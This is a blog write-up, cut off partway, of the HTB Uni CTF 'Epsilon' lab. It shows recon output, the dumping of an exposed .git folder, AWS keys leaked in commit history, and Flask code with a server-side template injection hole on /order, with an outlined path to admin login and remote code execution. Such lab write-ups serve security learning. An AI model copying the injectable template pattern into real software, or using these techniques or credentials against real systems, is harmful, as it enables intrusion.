<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="">
<meta name="description"
    content="Intro One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.
TLDR  Port 80 exposed public .git folder, dump it Found aws access key, use to get lambda function Found jwt secret key for app, use this to get admin login SSTI in app endpoint /order, get RCE and flag  Recon Nmap Open 10." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/htb-uni-ctf-epsilon-writeup/" />


<title>
    
    HTB UNI CTF - Cloud -  Epsilon Writeup :: Hello World. I am Dito Prabowo 
    
</title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.1e3781b80dd16493473cb3568a87d70e1a30cee34b5558dc6a9114b007652d4d.css">



<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627"><meta itemprop="name" content="HTB UNI CTF - Cloud -  Epsilon Writeup">
<meta itemprop="description" content="Intro One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.
TLDR  Port 80 exposed public .git folder, dump it Found aws access key, use to get lambda function Found jwt secret key for app, use this to get admin login SSTI in app endpoint /order, get RCE and flag  Recon Nmap Open 10."><meta itemprop="datePublished" content="2021-11-24T14:21:47+07:00" />
<meta itemprop="dateModified" content="2021-11-24T14:21:47+07:00" />
<meta itemprop="wordCount" content="900"><meta itemprop="image" content="/"/>
<meta itemprop="keywords" content="writeup,ctf,cloud," /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/"/>

<meta name="twitter:title" content="HTB UNI CTF - Cloud -  Epsilon Writeup"/>
<meta name="twitter:description" content="Intro One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.
TLDR  Port 80 exposed public .git folder, dump it Found aws access key, use to get lambda function Found jwt secret key for app, use this to get admin login SSTI in app endpoint /order, get RCE and flag  Recon Nmap Open 10."/>




<meta property="article:published_time" content="2021-11-24 14:21:47 &#43;0700 WIB" />







    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">$ cd /home/dmcr7</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>5 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title"><a href="/posts/htb-uni-ctf-epsilon-writeup/">HTB UNI CTF - Cloud -  Epsilon Writeup</a></h1>

            

            <div class="post-content">
                <h1 id="intro">Intro</h1>
<p>One of the local shops in your city is realising new costumes. Go grab them before they run out as the available stock is very limited.</p>
<h1 id="tldr">TLDR</h1>
<ul>
<li>Port 80 exposed public <code>.git</code> folder, dump it</li>
<li>Found aws access key, use to get lambda function</li>
<li>Found jwt secret key for app, use this to get admin login</li>
<li>SSTI in app endpoint <code>/order</code>, get RCE and flag</li>
</ul>
<h1 id="recon">Recon</h1>
<h2 id="nmap">Nmap</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">22</span>
Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">80</span>
Open <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>

PORT     STATE SERVICE REASON  VERSION
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp   open  ssh     syn<span style="color:#f92672">-</span>ack OpenSSH <span style="color:#ae81ff">8.2</span>p1 Ubuntu <span style="color:#ae81ff">4</span>ubuntu0<span style="color:#ae81ff">.2</span> (Ubuntu Linux; protocol <span style="color:#ae81ff">2.0</span>)
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp   open  http    syn<span style="color:#f92672">-</span>ack Apache httpd <span style="color:#ae81ff">2.4.41</span>
<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>git:
<span style="color:#f92672">|</span>   <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">80</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>
<span style="color:#f92672">|</span>     Git repository found<span style="color:#960050;background-color:#1e0010">!</span>
<span style="color:#f92672">|</span>     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the<span style="color:#f92672">...</span>
<span style="color:#f92672">|</span>_    Last commit message: Updating Tracking API  <span style="color:#75715e"># Please enter the commit message for...</span>
<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods:
<span style="color:#f92672">|</span>_  Supported Methods: OPTIONS HEAD GET POST
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4.41</span> (Ubuntu)
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: <span style="color:#ae81ff">403</span> Forbidden
<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>tcp open  http    syn<span style="color:#f92672">-</span>ack Werkzeug httpd <span style="color:#ae81ff">2.0.2</span> (Python <span style="color:#ae81ff">3.8.10</span>)
<span style="color:#f92672">|</span> http<span style="color:#f92672">-</span>methods:
<span style="color:#f92672">|</span>_  Supported Methods: POST HEAD OPTIONS GET
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>server<span style="color:#f92672">-</span>header: Werkzeug<span style="color:#f92672">/</span><span style="color:#ae81ff">2.0.2</span> Python<span style="color:#f92672">/</span><span style="color:#ae81ff">3.8.10</span>
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Costume Shop
Service Info: Host: <span style="color:#ae81ff">127.0.1.1</span>; OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel
</code></pre></div><h2 id="git-dumper">Git Dumper</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">~/.</span>local<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>git<span style="color:#f92672">-</span>dumper http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git <span style="color:#f92672">.</span>
[<span style="color:#f92672">-</span>] Testing http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>HEAD [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Testing http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span> [<span style="color:#ae81ff">403</span>]
[<span style="color:#f92672">-</span>] Fetching common files
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>description [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>applypatch<span style="color:#f92672">-</span>msg<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>update<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>pre<span style="color:#f92672">-</span>applypatch<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>receive<span style="color:#f92672">.</span>sample [<span style="color:#ae81ff">404</span>]
[<span style="color:#f92672">-</span>] http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>hooks<span style="color:#f92672">/</span>post<span style="color:#f92672">-</span>receive<span style="color:#f92672">.</span>sample responded <span style="color:#66d9ef">with</span> status code <span style="color:#ae81ff">404</span>
<span style="color:#f92672">...</span>
[<span style="color:#f92672">-</span>] Finding packs
[<span style="color:#f92672">-</span>] Finding objects
[<span style="color:#f92672">-</span>] Fetching objects
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>c<span style="color:#f92672">/</span><span style="color:#ae81ff">52105750831385</span>d4756111e1103957ac599d02 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>b1<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>dd06d56ac760efbbb5d254ea43bf9beb56d2d [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">/</span><span style="color:#ae81ff">00000000000000000000000000000000000000</span> [<span style="color:#ae81ff">404</span>]
[<span style="color:#f92672">-</span>] http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">00</span><span style="color:#f92672">/</span><span style="color:#ae81ff">00000000000000000000000000000000000000</span> responded <span style="color:#66d9ef">with</span> status code <span style="color:#ae81ff">404</span>
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>c5<span style="color:#f92672">/</span><span style="color:#ae81ff">1441640</span>fd25e9fba42725147595b5918eba0f1 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">7</span>c<span style="color:#f92672">/</span>f92a7a09e523c1c667d13847c9ba22464412f3 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>df<span style="color:#f92672">/</span>dfa17ca5701b1dca5069b6c3f705a038f4361e [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>c6<span style="color:#f92672">/</span><span style="color:#ae81ff">22771686</span>bd74c16ece91193d29f85b5f9ffa91 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>ce<span style="color:#f92672">/</span><span style="color:#ae81ff">401</span>ccecf421ff19bf43fafe8a60a0d0f0682d0 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>d<span style="color:#f92672">/</span><span style="color:#ae81ff">3</span>b52e153c7d5380b183bbbb51f5d4020944630 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">65</span><span style="color:#f92672">/</span>b80f62da28254f67f0bea392057fd7d2330e2d [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>ab<span style="color:#f92672">/</span><span style="color:#ae81ff">07</span>f7cdc7f410b8c8f848ee5674ec550ecb61ca [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>b5<span style="color:#f92672">/</span>f4c99c772eeb629e53d284275458d75ed9a010 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>cf<span style="color:#f92672">/</span><span style="color:#ae81ff">489</span>a3776d2bf87ac32de4579e852a4dc116ce8 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span><span style="color:#ae81ff">54</span><span style="color:#f92672">/</span><span style="color:#ae81ff">5</span>f6fe2204336c1ea21720cbaa47572eb566e34 [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Fetching http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span><span style="color:#f92672">/.</span>git<span style="color:#f92672">/</span>objects<span style="color:#f92672">/</span>fe<span style="color:#f92672">/</span>d7ab97cf361914f688f0e4f2d3adfafd1d7dca [<span style="color:#ae81ff">200</span>]
[<span style="color:#f92672">-</span>] Running git checkout <span style="color:#f92672">.</span>

</code></pre></div><p>found 2 file <code>server.py</code> and <code>track_api_CR_148.py</code> but cant find real secret key.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">server<span style="color:#f92672">.</span>py

<span style="color:#75715e">#!/usr/bin/python3</span>

<span style="color:#f92672">import</span> jwt
<span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

app <span style="color:#f92672">=</span> Flask(__name__)
secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;secret_key&gt;&#39;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_jwt</span>(token,key):
        <span style="color:#66d9ef">try</span>:
                username<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>decode(token,key,algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>,])[<span style="color:#e6db74">&#39;username&#39;</span>]
                <span style="color:#66d9ef">if</span> username:
                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
        <span style="color:#66d9ef">except</span>:
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
                <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">and</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;admin&#34;</span>:
                        res <span style="color:#f92672">=</span> make_response()
                        username<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;username&#39;</span>]
                        token<span style="color:#f92672">=</span>jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>},secret,algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)
                        res<span style="color:#f92672">.</span>set_cookie(<span style="color:#e6db74">&#34;auth&#34;</span>,token)
                        res<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;location&#39;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/home&#39;</span>
                        <span style="color:#66d9ef">return</span> res,<span style="color:#ae81ff">302</span>
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/home&#34;</span>)
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
        <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;home.html&#39;</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#34;/track&#34;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">track</span>():
        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
                <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;track.html&#39;</span>,message<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;track.html&#39;</span>)

<span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/order&#39;</span>,methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>,<span style="color:#e6db74">&#34;POST&#34;</span>])
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">order</span>():
        <span style="color:#66d9ef">if</span> verify_jwt(request<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;auth&#39;</span>),secret):
                <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method<span style="color:#f92672">==</span><span style="color:#e6db74">&#34;POST&#34;</span>:
                        costume<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;costume&#34;</span>]
                        message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">                        Your order of &#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34; has been placed successfully.
</span><span style="color:#e6db74">                        &#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(costume)
                        tmpl<span style="color:#f92672">=</span>render_template_string(message,costume<span style="color:#f92672">=</span>costume)
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;order.html&#39;</span>,message<span style="color:#f92672">=</span>tmpl)
                <span style="color:#66d9ef">else</span>:
                        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;order.html&#39;</span>)
        <span style="color:#66d9ef">else</span>:
                <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/&#39;</span>,code<span style="color:#f92672">=</span><span style="color:#ae81ff">302</span>)
app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;true&#39;</span>)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">track_api_CR_148<span style="color:#f92672">.</span>py
<span style="color:#f92672">import</span> io
<span style="color:#f92672">import</span> os
<span style="color:#f92672">from</span> zipfile <span style="color:#f92672">import</span> ZipFile
<span style="color:#f92672">from</span> boto3.session <span style="color:#f92672">import</span> Session


session <span style="color:#f92672">=</span> Session(
    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_access_key_id&gt;&#39;</span>,
    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
    region_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;us-east-1&#39;</span>,
    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilon.htb&#39;</span>)
aws_lambda <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>client(<span style="color:#e6db74">&#39;lambda&#39;</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">files_to_zip</span>(path):
    <span style="color:#66d9ef">for</span> root, dirs, files <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>walk(path):
        <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> files:
            full_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(root, f)
            archive_name <span style="color:#f92672">=</span> full_path[len(path) <span style="color:#f92672">+</span> len(os<span style="color:#f92672">.</span>sep):]
            <span style="color:#66d9ef">yield</span> full_path, archive_name


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_zip_file_bytes</span>(path):
    buf <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>BytesIO()
    <span style="color:#66d9ef">with</span> ZipFile(buf, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> z:
        <span style="color:#66d9ef">for</span> full_path, archive_name <span style="color:#f92672">in</span> files_to_zip(path<span style="color:#f92672">=</span>path):
            z<span style="color:#f92672">.</span>write(full_path, archive_name)
    <span style="color:#66d9ef">return</span> buf<span style="color:#f92672">.</span>getvalue()


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update_lambda</span>(lambda_name, lambda_code_path):
    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isdir(lambda_code_path):
        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#39;Lambda directory does not exist: </span><span style="color:#e6db74">{0}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(lambda_code_path))
    aws_lambda<span style="color:#f92672">.</span>update_function_code(
        FunctionName<span style="color:#f92672">=</span>lambda_name,
        ZipFile<span style="color:#f92672">=</span>make_zip_file_bytes(path<span style="color:#f92672">=</span>lambda_code_path))
</code></pre></div><p>Enumerating on git log, found aws access key that can used to access.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 <span style="color:#f92672">(</span>HEAD -&gt; master<span style="color:#f92672">)</span>
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 17:41:07 <span style="color:#ae81ff">2021</span> +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:02:59 <span style="color:#ae81ff">2021</span> +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:00:58 <span style="color:#ae81ff">2021</span> +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov <span style="color:#ae81ff">17</span> 10:00:28 <span style="color:#ae81ff">2021</span> +0000

    Adding Tracking API Module


$ git diff master 7cf92a7a09e523c1c667d13847c9ba22464412f3

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
index 8d3b52e..fed7ab9 <span style="color:#ae81ff">100644</span>
--- a/track_api_CR_148.py
+++ b/track_api_CR_148.py
@@ -5,11 +5,11 @@ from boto3.session import Session
...
-    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_access_key_id&gt;&#39;</span>,
-    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;aws_secret_access_key&gt;&#39;</span>,
+    aws_access_key_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;AQLA5M37BDN6FJP76TDC&#39;</span>,
+    aws_secret_access_key<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A&#39;</span>,
     region_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;us-east-1&#39;</span>,
-    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilon.htb&#39;</span><span style="color:#f92672">)</span>
-aws_lambda <span style="color:#f92672">=</span> session.client<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;lambda&#39;</span><span style="color:#f92672">)</span>
+    endpoint_url<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://cloud.epsilong.htb&#39;</span><span style="color:#f92672">)</span>
+aws_lambda <span style="color:#f92672">=</span> session.client<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;lambda&#39;</span><span style="color:#f92672">)</span>

</code></pre></div><h1 id="pwning">PWNING</h1>
<p>we get aws cred and there is endpoint aws lambda in code, try to enumerate and get function from aws lambda.</p>
